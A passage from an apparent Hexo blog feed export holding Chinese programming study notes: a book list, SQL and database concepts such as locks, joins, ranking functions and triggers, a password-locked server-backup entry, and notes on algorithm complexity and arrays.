<li><a href="https://book.douban.com/subject/20432061/" target="_blank" rel="noopener">《算法导论》</a></li>
</ul>
<h5 id="思维改善"><a href="#思维改善" class="headerlink" title="思维改善"></a>思维改善</h5><ul>
<li><a href="https://book.douban.com/subject/3227098/" target="_blank" rel="noopener">《编程珠玑》</a></li>
</ul>
<h5 id="基础算法题"><a href="#基础算法题" class="headerlink" title="基础算法题"></a>基础算法题</h5><p>其中有大量的算法题，解这些题都是有套路的，不是用递归（深度优先DFS，广度优先BFS），就是要用动态规划（Dynamic Programming），或是折半查找（Binary Search），或是回溯（Back tracing），或是分治法（Divide and Conquer），还有大量的对树、数组、链表、字符串和hash表的操作。通过做这些题能让你对这些最基础的算法的思路有非常扎实的了解和训练。对我而言，Dynamic Programming是我的短板，尤其是一些比较复杂的问题，在推导递推公式上总是有思维的缺陷（数学是我的硬伤）。做了这些题后，我能感到我在动态编程的思路上受到了很大的启发。</p>
<h5 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h5><p>比如：atoi，strstr，add two nums，括号匹配，字符串乘法，通配符匹配，文件路径简化，Text Justification，反转单词等，这些题的Edge Case和Corner Case有很多。这些题需要你想清楚了再干，只要你稍有疏忽，就会有几个case让你痛不欲生，而且一不小心就会让你的代码写得又臭又长，无法阅读。通过做这些题，可以非常好地训练你对各种情况的考虑，以及你对程序代码组织的掌控（其实就是其中的状态变量）。</p>
<ul>
<li><ul>
<li><a href="https://github.com/haoel/leetcode" target="_blank" rel="noopener">Leetcode  Github </a></li>
</ul>
</li>
<li><ul>
<li><a href="https://www.wikiwand.com/en/List_of_algorithms" target="_blank" rel="noopener">List of Algorithms(算法字典)</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html" target="_blank" rel="noopener">Data Structure Visualizations(数据结构动画图)</a></li>
</ul>
</li>
</ul>
<h4 id="其它理论基础知识"><a href="#其它理论基础知识" class="headerlink" title="其它理论基础知识"></a>其它理论基础知识</h4><ul>
<li><a href="https://book.douban.com/subject/1139426/" target="_blank" rel="noopener">《数据结构与算法分析》</a></li>
<li><a href="https://book.douban.com/subject/1929984/" target="_blank" rel="noopener">《数据库系统概念》</a></li>
<li><a href="https://book.douban.com/subject/3852290/" target="_blank" rel="noopener">《现代操作系统》</a></li>
<li><a href="https://book.douban.com/subject/1391207/" target="_blank" rel="noopener">《计算机网络》</a></li>
<li><a href="https://book.douban.com/subject/1148282/" target="_blank" rel="noopener">《计算机程序的构造和解释》</a></li>
<li><a href="https://book.douban.com/subject/3296317/" target="_blank" rel="noopener">《编译原理》</a></li>
</ul>
<h3 id="计算机系统相关知识"><a href="#计算机系统相关知识" class="headerlink" title="计算机系统相关知识"></a>计算机系统相关知识</h3><ul>
<li><a href="https://book.douban.com/subject/5333562/" target="_blank" rel="noopener">《深入理解计算机系统》原名：《Computer Systems A Programmer’s Perspective》</a>:程序员必读<h4 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h4></li>
<li><a href="https://book.douban.com/subject/4141733/" target="_blank" rel="noopener">《Linux C编程一站式学习》</a></li>
<li><a href="https://book.douban.com/subject/25911735/" target="_blank" rel="noopener">《TCP/IP网络编程》</a></li>
<li><a href="https://book.douban.com/subject/24737674/" target="_blank" rel="noopener">《图解TCP/IP》</a></li>
<li><a href="http://www.tcpipguide.com/free/index.htm" target="_blank" rel="noopener">《The TCP/IP Guide》</a></li>
<li><a href="https://book.douban.com/subject/21691692/" target="_blank" rel="noopener">《Wireshark数据包分析实战》</a>:抓包相关<h4 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h4></li>
<li><a href="https://book.douban.com/subject/1788421/" target="_blank" rel="noopener">《Unix高级环境编程》</a></li>
<li><a href="https://book.douban.com/subject/1500149/" target="_blank" rel="noopener">《Unix网络编程》 第1卷 套接口API </a></li>
<li><a href="https://book.douban.com/subject/4118577/" target="_blank" rel="noopener">《Unix网络编程》第2卷 进程间通信 </a></li>
<li><p><a href="https://book.douban.com/subject/1088054/" target="_blank" rel="noopener">《TCP/IP详解 卷I 协议》</a></p>
</li>
<li><p><a href="https://book.douban.com/subject/25809330/" target="_blank" rel="noopener">《Linux/Unix系统编程手册》</a></p>
</li>
<li><a href="http://igm.univ-mlv.fr/~yahya/progsys/linux.pdf" target="_blank" rel="noopener">Linux System Programming 英文电子版</a></li>
<li><p><a href="https://book.douban.com/subject/25828773/" target="_blank" rel="noopener">中文翻译版Linux系统编程 </a></p>
</li>
<li><p><a href="https://www.oschina.net/translate/c10k" target="_blank" rel="noopener">“C10K Problem （中文翻译版）”</a></p>
</li>
<li><a href="http://highscalability.com/blog/2013/5/13/the-secret-to-10-million-concurrent-connections-the-kernel-i.html" target="_blank" rel="noopener">The Secret To 10 Million Concurrent Connections -The Kernel Is The Problem, Not The Solution</a>:C10M问题</li>
</ul>
]]></content>
      <categories>
        <category>书籍</category>
      </categories>
      <tags>
        <tag>左耳朵耗子</tag>
        <tag>书籍</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库复盘笔记</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E7%9B%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="笔记大杂烩"><a href="#笔记大杂烩" class="headerlink" title="笔记大杂烩"></a>笔记大杂烩</h2><p>对于表数据量少，插入，更新操作多的表，添加索引可能会使查询速度变慢。索引并适合表频繁的update，insert，delete操作，这样会频繁的修改索引，造成性能低下<br>索引类似于指针访问，又类似数组的下标访问，所以可以快速定位，避免全局扫描</p>
<p>自然联接是关系的横向结合，是将两个关系拼接成一个更宽的新关系，要求两个关系含有一个或多个共有的属性，生成的新关系中包含满足联接条件的元组。</p>
<p>元组（tuple）是关系数据库中的基本概念，关系是一张表，表中的每行（即数据库中的每条记录）就是一个元组，每列就是一个属性。 在二维表里，元组也称为行。<br>表中的一行也称为一条记录。</p>
<p>自然连接(Natural join)是一种特殊的等值连接，它要求两个关系中进行比较的分量必须是相同的属性组，并且在结果中把重复的属性列去掉。而等值连接并不去掉重复的属性列<br><a id="more"></a><br>共享锁【S锁】<br>又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S 锁之前不能对A做任何修改。</p>
<p>排他锁【X锁】<br>又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。</p>
<p>数据库系统在三级模式之间提供了两级映像：模式/内模式的映像、外模式/模式的映像。这两级映射保证了数据库中的数据具有较高的物理独立性和逻辑独立性。<br>•模式/内模式的映像：实现概念模式到内模式之间的相互转换。<br>•外模式/模式的映像：实现外模式到概念模式之间的相互转换。<br>数据的独立性是指数据与程序独立，将数据的定义从程序中分离出去，由DBMS负责数据的存储，从而简化应用程序，大大减少应用程序编制的工作量。数据的独立性是由DBMS的二级映像功能来保证的。数据的独立性包括数据的物理独立性和数据的逻辑独立性。<br>数据的物理独立性是指当数据库的内模式发生改变时，数据的的逻辑结构不变。由于应用程序处理的只是数据的逻辑结构，这样物理独立性可以保证，当数据的物理结构改变了，应用程序不用改变。但是，为了保证应用程序能够正确执行，需要修改概念模式/内模式之间的映像。<br>数据的逻辑独立性是指用户的应用程序与数据库结构是相互独立的。数据的逻辑结构发生变化后，用户程序也可以不修改。但是，为了保证应用程序能够正确执行，需要修改外模式/概念模式之间的映像。</p>
<p>把对关系SC的属性GRADE的修改权授予用户ZHAO的T-SQL语句是 <code>GRANT UPDATE (GRADE) ON SC TO ZHAO</code></p>
<p>数据库恢复的基础是利用转储的冗余数据。这些转储的冗余数据包括： 日志文件、数据库后备副本</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="数据库存储引擎说下吧："><a href="#数据库存储引擎说下吧：" class="headerlink" title="数据库存储引擎说下吧："></a>数据库存储引擎说下吧：</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/5bnS3ql5YD1N.png" alt="mark"></p>
<h3 id="on-与-where-有什么区别？having呢？"><a href="#on-与-where-有什么区别？having呢？" class="headerlink" title="on 与 where 有什么区别？having呢？"></a>on 与 where 有什么区别？having呢？</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/h44NjtO1KMnI.png" alt="mark"></p>
<h3 id="group-by-只是做一个聚合嘛？"><a href="#group-by-只是做一个聚合嘛？" class="headerlink" title="group by 只是做一个聚合嘛？"></a>group by 只是做一个聚合嘛？</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/4PREKy7CqVJn.png" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/7LHTUMwKoU3w.png" alt="mark"></p>
<h3 id="like-通配符，能匹配所有嘛，有不可的嘛？"><a href="#like-通配符，能匹配所有嘛，有不可的嘛？" class="headerlink" title="like 通配符，能匹配所有嘛，有不可的嘛？"></a>like 通配符，能匹配所有嘛，有不可的嘛？</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/qBfPK9GnIMdc.png" alt="mark"></p>
<h3 id="inner-join、left-join、right-join、full-join有什么区别？"><a href="#inner-join、left-join、right-join、full-join有什么区别？" class="headerlink" title="inner join、left join、right join、full join有什么区别？"></a>inner join、left join、right join、full join有什么区别？</h3><p><img data-src="https://www.runoob.com/wp-content/uploads/2019/01/sql-join.png" alt></p>
<p>注释：INNER JOIN 与 JOIN 是相同的。</p>
<p><img data-src="https://www.runoob.com/wp-content/uploads/2013/09/img_innerjoin.gif" alt></p>
<p><img data-src="https://www.runoob.com/wp-content/uploads/2013/09/img_leftjoin.gif" alt><br><img data-src="https://www.runoob.com/wp-content/uploads/2013/09/img_rightjoin.gif" alt><br><img data-src="https://www.runoob.com/wp-content/uploads/2013/09/img_fulljoin.gif" alt></p>
<h3 id="Union-联合什么玩意？"><a href="#Union-联合什么玩意？" class="headerlink" title="Union 联合什么玩意？"></a>Union 联合什么玩意？</h3><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。<br>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>
<p>就是从两个表里面抽格式一样的数据拼在一起。</p>
<h3 id="having-是个什么鬼，到底怎么用的？"><a href="#having-是个什么鬼，到底怎么用的？" class="headerlink" title="having 是个什么鬼，到底怎么用的？"></a>having 是个什么鬼，到底怎么用的？</h3><p>在 SQL 中增加 HAVING 子句原因是，WHERE 关键字无法与聚合函数一起使用。<br>HAVING 子句可以让我们筛选分组后的各组数据。</p>
<h3 id="怎么用的？"><a href="#怎么用的？" class="headerlink" title="怎么用的？"></a>怎么用的？</h3><p>在表中，一个列可能会包含多个重复值，有时您也许希望仅仅列出不同（distinct）的值。<br>DISTINCT 关键词用于返回唯一不同的值。</p>
<h3 id="ORDER-BY-与-LIMIT"><a href="#ORDER-BY-与-LIMIT" class="headerlink" title="ORDER BY  与 LIMIT"></a>ORDER BY  与 LIMIT</h3><p>是不是去重是关键？</p>
<p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。<br>ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。<br>使用 ORDER BY 可以将查询结果根据列名排序，默认时升序，使用DESC改成降序，DESC只对前面一个列名起作用。</p>
<p>ORDER BY 排列时，不写明ASC DESC的时候，默认是ASC。</p>
<p>limit关键字用来在查询结果集中，选择指定的行返回，常常用来实现翻页功能。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table limit 10;	// limit n;		返回查询结果的前n条数据</span><br><span class="line">select * from table limit 0,10;	//limit offset, n;	返回从offset + 1开始的n条数据</span><br><span class="line">select top 10 * from table order by id;</span><br></pre></td></tr></table></figure></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/Jyj542PYGyfj.png" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/WwnTXOUyNVNz.png" alt="mark"></p>
<h3 id="SQL中的rank-，dense-rank-，row-number"><a href="#SQL中的rank-，dense-rank-，row-number" class="headerlink" title="SQL中的rank()，dense_rank()，row_number()"></a>SQL中的rank()，dense_rank()，row_number()</h3><p>rank函数用于返回结果集的分区内每行的排名，行的排名是相关行之前的排名数加一。<br>简单来说rank函数就是对查询出来的记录进行排名，与row_number函数不同的是，rank函数考虑到了over子句中排序字段值相同的情况，如果使用rank函数来生成序号，over子句中排序字段值相同的序号是一样的，后面字段值不相同的序号将跳过相同的排名号排下一个，也就是相关行之前的排名数加一，可以理解为根据当前的记录数生成序号，后面的记录依此类推。</p>
<p>dense_rank函数的功能与rank函数类似，dense_rank函数在生成序号时是连续的，而rank函数生成的序号有可能不连续。dense_rank函数出现相同排名时，将不跳过相同排名号，rank值紧接上一次的rank值。在各个分组内，rank()是跳跃排序，有两个第一名时接下来就是第三名，dense_rank()是连续排序，有两个第一名时仍然跟着第二名。</p>
<p>row_number的用途非常广泛，排序最好用它，它会为查询出来的每一行记录生成一个序号，依次排序且不会重复，注意使用row_number函数时必须要用over子句选择对某一列进行排序才能生成序号。</p>
<p>–rank() 跳跃排序，如果有两个第一级别时，接下来是第三级别<br><code>select name,course,rank() over(partition by course order by score desc) rank from student;</code></p>
<p>–dense_rank() 连续排序，如果有两个第一级别时，接下来是第二级别<br><code>select name,course,dense_rank() over(partition by course order by score desc) rank from student;</code></p>
<p>–row_number() 顺序排序<br><code>select name,course,row_number() over(partition by course order by score desc) rank from student;</code></p>
<h3 id="数据库中的-符号是个什么鬼？"><a href="#数据库中的-符号是个什么鬼？" class="headerlink" title="数据库中的@符号是个什么鬼？"></a>数据库中的@符号是个什么鬼？</h3><h3 id="”-“-是个什么符号？"><a href="#”-“-是个什么符号？" class="headerlink" title="||” “|| 是个什么符号？"></a>||” “|| 是个什么符号？</h3><h3 id="什么叫子查询方法，还有其他方法嘛？"><a href="#什么叫子查询方法，还有其他方法嘛？" class="headerlink" title="什么叫子查询方法，还有其他方法嘛？"></a>什么叫子查询方法，还有其他方法嘛？</h3><h3 id="insert-or-ignore-into-什么鬼？"><a href="#insert-or-ignore-into-什么鬼？" class="headerlink" title="insert or ignore into 什么鬼？"></a>insert or ignore into 什么鬼？</h3><h3 id="创建一张新表，从老表中抽取数据怎么整？"><a href="#创建一张新表，从老表中抽取数据怎么整？" class="headerlink" title="创建一张新表，从老表中抽取数据怎么整？"></a>创建一张新表，从老表中抽取数据怎么整？</h3><h3 id="怎么创建索引？唯一索引？普通索引？强制索引"><a href="#怎么创建索引？唯一索引？普通索引？强制索引" class="headerlink" title="怎么创建索引？唯一索引？普通索引？强制索引?"></a>怎么创建索引？唯一索引？普通索引？强制索引?</h3><p>本题要用两条语句完成，先用 CREATE<br>UNIQUE INDEX … ON … 对first_name创建唯一索引值，再用 CREATE INDEX … ON …<br>对last_name创建普通索引值</p>
<p>SQLite中，使用 INDEXED BY 语句进行强制索引查询.<br>MySQL中，使用 FORCE INDEX 语句进行强制索引查询.</p>
<h3 id="创建视图？包含的列重命名？"><a href="#创建视图？包含的列重命名？" class="headerlink" title="创建视图？包含的列重命名？"></a>创建视图？包含的列重命名？</h3><p>视图（View）只不过是通过相关的名称存储在数据库中的一个 SQLite 语句。视图（View）实际上是一个以预定义的 SQLite 查询形式存在的表的组合。</p>
<p>视图（View）可以包含一个表的所有行或从一个或多个表选定行。视图（View）可以从一个或多个表创建，这取决于要创建视图的 SQLite 查询。</p>
<p>视图（View）是一种虚表，允许用户实现以下几点：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户或用户组查找结构数据的方式更自然或直观。</span><br><span class="line"></span><br><span class="line">限制数据访问，用户只能看到有限的数据，而不是完整的表。</span><br><span class="line"></span><br><span class="line">汇总各种表中的数据，用于生成报告。</span><br></pre></td></tr></table></figure></p>
<p>SQLite 视图是只读的，因此可能无法在视图上执行 DELETE、INSERT 或 UPDATE 语句。但是可以在视图上创建一个触发器，当尝试 DELETE、INSERT 或 UPDATE 视图时触发，需要做的动作在触发器内容中定义。</p>
<h3 id="表更新"><a href="#表更新" class="headerlink" title="表更新"></a>表更新</h3><p>用 ALTER TABLE … ADD …<br>语句可以向已存在的表插入新字段，并且能够与创建表时一样，在字段名和数据类型后加入NOT NULL、DEFAULT等限定，可参考：</p>
<p>以及哪个replace的作用：</p>
<h3 id="触发器更新"><a href="#触发器更新" class="headerlink" title="触发器更新"></a>触发器更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造触发器时注意以下几点：</span><br><span class="line">1、用 CREATE TRIGGER 语句构造触发器，用 BEFORE或AFTER 来指定在执行后面的SQL语句之前或之后来触发TRIGGER</span><br><span class="line">2、触发器执行的内容写出 BEGIN与END 之间</span><br><span class="line">3、可以使用 NEW与OLD 关键字访问触发后或触发前的employees_test表单记录</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.create trigger ：创建触发器</span><br><span class="line">2.触发器要说明是在after 还是before事务发生时触发</span><br><span class="line">3.要指明是insert 、delete、update操作</span><br><span class="line">4.on 表名</span><br><span class="line">5.begin和end之间写触发的动作</span><br><span class="line">6.new 关键字表示更新后的表的字段 ，old表示更新前的表的字段</span><br></pre></td></tr></table></figure>
<h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><p> 两种方式<br>1、传统<br>alter table 表名 change 原列名 新列名  类型； –修改表的列属性名<br>alter table 表名 modify 列名 类型 ；  –修改表的类类型<br>alter table 表名 drop 列名；  –删除表的某一列<br>alter table 表名 add  列名 类型；–添加某一列<br>alter table 表名 rename 新表名； –修改表名</p>
<p>2、先备份再删除</p>
<h3 id="创建外键约束"><a href="#创建外键约束" class="headerlink" title="创建外键约束"></a>创建外键约束</h3><p>划重点  1、先删后增   2、直接命令执行</p>
<h4 id="外键约束是个什么鬼呢？"><a href="#外键约束是个什么鬼呢？" class="headerlink" title="外键约束是个什么鬼呢？"></a>外键约束是个什么鬼呢？</h4><p>保证了数据的一致性合完整性</p>
<h4 id="约束分类有哪几种？有几种分类方式？"><a href="#约束分类有哪几种？有几种分类方式？" class="headerlink" title="约束分类有哪几种？有几种分类方式？"></a>约束分类有哪几种？有几种分类方式？</h4><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/INRAwamvIpDc.png" alt="mark"></p>
<h4 id="创建外键约束条件有哪些？"><a href="#创建外键约束条件有哪些？" class="headerlink" title="创建外键约束条件有哪些？"></a>创建外键约束条件有哪些？</h4><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201118/gpT0oSmAVb8D.png" alt="mark"></p>
<h2 id="表清空"><a href="#表清空" class="headerlink" title="表清空"></a>表清空</h2><p>清空表和截断表</p>
<h2 id="性能调优"><a href="#性能调优" class="headerlink" title="性能调优"></a>性能调优</h2><h3 id="性能监控"><a href="#性能监控" class="headerlink" title="性能监控"></a>性能监控</h3><p>1、show profiles</p>
<p>set profiling=1</p>
<p>show profile</p>
<p>2、链接器</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器备份</title>
    <url>/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%87%E4%BB%BD/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构与算法之美</title>
    <url>/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/</url>
    <content><![CDATA[<p>笔记整理</p>
<h2 id="1-学习技巧–王争"><a href="#1-学习技巧–王争" class="headerlink" title="1.学习技巧–王争"></a>1.学习技巧–王争</h2><p><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E7%AE%97%E6%B3%95%E4%B8%80.jpg" alt></p>
<ul>
<li><ol>
<li>边学边练，适度刷题</li>
</ol>
</li>
<li><ol start="2">
<li>多问、多思考、多互动</li>
</ol>
</li>
<li><ol start="3">
<li>打怪升级学习法<br>比如，针对这个专栏，你就可以设立这样一个目标：每节课后的思考…<a id="more"></a></li>
</ol>
</li>
<li><ol start="4">
<li>知识需要沉淀，不要想试图一下子掌握所有<br>学习知识的过程是反复迭代、不断沉淀的过程，书读百遍其义自见。</li>
</ol>
</li>
</ul>
<h2 id="2-时间复杂度思考"><a href="#2-时间复杂度思考" class="headerlink" title="2.时间复杂度思考"></a>2.时间复杂度思考</h2><h2 id="3-空间复杂度思考"><a href="#3-空间复杂度思考" class="headerlink" title="3.空间复杂度思考"></a>3.空间复杂度思考</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="一、什么是复杂度分析？"><a href="#一、什么是复杂度分析？" class="headerlink" title="一、什么是复杂度分析？"></a>一、什么是复杂度分析？</h4><p>1.数据结构和算法解决是“如何让计算机更快时间、更省空间的解决问题”。<br>2.因此需从执行时间和占用空间两个维度来评估数据结构和算法的性能。<br>3.分别用时间复杂度和空间复杂度两个概念来描述性能问题，二者统称为复杂度。<br>4.复杂度描述的是算法执行时间（或占用空间）与数据规模的增长关系。</p>
<h4 id="二、为什么要进行复杂度分析？"><a href="#二、为什么要进行复杂度分析？" class="headerlink" title="二、为什么要进行复杂度分析？"></a>二、为什么要进行复杂度分析？</h4><p>1.和性能测试相比，复杂度分析有不依赖执行环境、成本低、效率高、易操作、指导性强的特点。<br>2.掌握复杂度分析，将能编写出性能更优的代码，有利于降低系统开发和维护成本。</p>
<h4 id="三、如何进行复杂度分析？"><a href="#三、如何进行复杂度分析？" class="headerlink" title="三、如何进行复杂度分析？"></a>三、如何进行复杂度分析？</h4><h5 id="1-大O表示法"><a href="#1-大O表示法" class="headerlink" title="1.大O表示法"></a>1.大O表示法</h5><p>1）来源<br>算法的执行时间与每行代码的执行次数成正比，用T(n) = O(f(n))表示，其中T(n)表示算法执行总时间，f(n)表示每行代码执行总次数，而n往往表示数据的规模。<br>2）特点<br>以时间复杂度为例，由于时间复杂度描述的是算法执行时间与数据规模的增长变化趋势，所以常量阶、低阶以及系数实际上对这种增长趋势不产决定性影响，所以在做时间复杂度分析时忽略这些项。</p>
<h5 id="2-复杂度分析法则"><a href="#2-复杂度分析法则" class="headerlink" title="2.复杂度分析法则"></a>2.复杂度分析法则</h5><p>1）单段代码看高频：比如循环。<br>2）多段代码取最大：比如一段代码中有单循环和多重循环，那么取多重循环的复杂度。<br>3）嵌套代码求乘积：比如递归、多重循环等<br>4）多个规模求加法：比如方法有两个参数控制两个循环的次数，那么这时就取二者复杂度相加。</p>
<h4 id="四、常用的复杂度级别？"><a href="#四、常用的复杂度级别？" class="headerlink" title="四、常用的复杂度级别？"></a>四、常用的复杂度级别？</h4><p>多项式阶：随着数据规模的增长，算法的执行时间和空间占用，按照多项式的比例增长。包括，<br>O(1)（常数阶）、O(logn)（对数阶）、O(n)（线性阶）、O(nlogn)（线性对数阶）、O(n^2)（平方阶）、O(n^3)（立方阶）<br>非多项式阶：随着数据规模的增长，算法的执行时间和空间占用暴增，这类算法性能极差。包括，<br>O(2^n)（指数阶）、O(n!)（阶乘阶）</p>
<h4 id="五、如何掌握好复杂度分析方法？"><a href="#五、如何掌握好复杂度分析方法？" class="headerlink" title="五、如何掌握好复杂度分析方法？"></a>五、如何掌握好复杂度分析方法？</h4><p>复杂度分析关键在于多练，所谓孰能生巧。</p>
<h2 id="4-数据结构与算法思考"><a href="#4-数据结构与算法思考" class="headerlink" title="4.数据结构与算法思考"></a>4.数据结构与算法思考</h2><p>算法就是操作数据的一组方法。<br>数据结构就是一组数据的存储结构。<br>二者关系：数据结构是为算法服务的，算法要作用于特定的数据结构之上。数据结构是静态的，必须基于它操作和构建算法，数据结构才有意义。</p>
<p>数据结构三要素：数据逻辑结构、数据存储结构和数据的运算。</p>
<h3 id="从广义和狭义两个层面理解数据结构与算法"><a href="#从广义和狭义两个层面理解数据结构与算法" class="headerlink" title="从广义和狭义两个层面理解数据结构与算法"></a>从广义和狭义两个层面理解数据结构与算法</h3><ul>
<li><p>1.广义：数据结构是指一组数据的存储结构。算法是操作数据的一组方法</p>
</li>
<li><ul>
<li>图书馆找书的例子</li>
</ul>
</li>
<li><p>2.狭义：指出专栏主要讲解著名的数据结构和算法，队列，栈，二分查找，动态规划等。经典的算法可以高效的帮我们解决实际开发问题</p>
</li>
<li><p>3.为什么数据结构和算法会放到一起？</p>
</li>
</ul>
<p>数据结构是为算法服务的，算法要作用在特定的数据结构之上。<br>数据结构是静态的，它只是组指数据的一种方式。如果不在它的基础上操作，构建算法，孤立存在的数据结构就没有用。</p>
<p>复杂度就是用来分析算法执行效率与数据规模之间增长关系。</p>
<h3 id="性能测试与复杂度分析不冲突，原因如下："><a href="#性能测试与复杂度分析不冲突，原因如下：" class="headerlink" title="性能测试与复杂度分析不冲突，原因如下："></a>性能测试与复杂度分析不冲突，原因如下：</h3><p>1、性能测试是依附于具体的环境，如SIT、UAT机器配置及实例数量不一致结果也有差别。<br>2、复杂度分析是独立于环境的，可以大致估算出程序所执行的效率。<br>3、将复杂度熟记于心，能够写出更高效率、更好性能的代码。若某接口通过性能测试，达不到预期，还可以用复杂度分析接口代码，找出最影响性能的代码，进行优化。</p>
<h3 id="每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？"><a href="#每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？" class="headerlink" title="每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？"></a>每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？</h3><p>这个问题分两种情况讨论<br>1、开发过程中，码代码的过程中就能得出其复杂度，这并不会太多的浪费时间，同时只有分析了每段代码的复杂度，才能估算出它们的执行效率。<br>2、优化代码时，只有在分析每段代码的复杂度后，才能定位问题代码，才能做相应优化</p>
<h2 id="05、为什么数组要从-0-开始编号，而不是从-1-开始呢？"><a href="#05、为什么数组要从-0-开始编号，而不是从-1-开始呢？" class="headerlink" title="05、为什么数组要从 0 开始编号，而不是从 1 开始呢？"></a>05、为什么数组要从 0 开始编号，而不是从 1 开始呢？</h2><h4 id="1、数组（Array）："><a href="#1、数组（Array）：" class="headerlink" title="1、数组（Array）："></a>1、数组（Array）：</h4><p>是一种线性表数据结构。它用一组连续的内存空间，来存储一组具有相同类型的数据。</p>
<h4 id="2、线性表（Linear-List）："><a href="#2、线性表（Linear-List）：" class="headerlink" title="2、线性表（Linear List）："></a>2、线性表（Linear List）：</h4><p>顾名思义，线性表就是数据排成像一条线一样的结构。每个线性表上的数据最多只有前和后两个方向。其实除了数组，链表、队列、栈等也是线性表结构。</p>
<h4 id="3、非线性表："><a href="#3、非线性表：" class="headerlink" title="3、非线性表："></a>3、非线性表：</h4><p>比如二叉树、堆、图等。之所以叫非线性，是因为，在非线性表中，数据之间并不是简单的前后关系。</p>
<h4 id="4、连续的内存空间和相同类型的数据："><a href="#4、连续的内存空间和相同类型的数据：" class="headerlink" title="4、连续的内存空间和相同类型的数据："></a>4、连续的内存空间和相同类型的数据：</h4><p>这两个限制也让数组的很多操作变得非常低效，比如要想在数组中删除、插入一个数据，为了保证连续性，就需要做大量的数据搬移工作。<br>当计算机需要随机访问数组中的某个元素时，它会首先通过下面的寻址公式，计算出该元素存储的内存地址：a[i]_address = base_address + i * data_type_size</p>
<h4 id="5、删除操作："><a href="#5、删除操作：" class="headerlink" title="5、删除操作："></a>5、删除操作：</h4><p>记录下已经被删除的数据，每次的删除操作并不是搬移数据，只是记录数据已经被删除，当数组没有更多的存储空间时，再触发一次真正的删除操作。即JVM标记清除垃圾回收算法。</p>
<h4 id="6、警惕数组的访问越界问题："><a href="#6、警惕数组的访问越界问题：" class="headerlink" title="6、警惕数组的访问越界问题："></a>6、警惕数组的访问越界问题：</h4><p>关于数组越界访问导致死循环的问题，我也动手实践了一下，发现结果和编译器的实现有关，gcc有一个编译选项（-fno-stack-protector）用于关闭堆栈保护功能。默认情况下启动了堆栈保护，不管i声明在前还是在后，i都会在数组之后压栈，只会循环4次；如果关闭堆栈保护功能，则会出现死循环。请参考：<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/index.html</a></p>
